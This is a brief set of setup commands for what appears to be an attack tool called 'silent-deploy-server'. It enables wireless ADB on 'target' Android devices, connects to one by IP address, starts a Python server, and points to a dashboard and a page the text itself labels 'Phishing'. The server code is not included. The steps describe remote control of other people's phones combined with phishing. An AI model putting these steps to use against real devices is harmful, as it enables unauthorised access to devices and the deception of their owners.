# Clone & Setup
mkdir silent-deploy-server && cd silent-deploy-server
# Copy all files above

# Install deps
pip install -r requirements.txt

# Enable wireless ADB on targets
adb tcpip 5555
adb connect 192.168.1.100:5555

# Start server
python server.py

# Access:
# Dashboard: http://your_ip:8080/
# Phishing: http://your_ip:8080/shortcut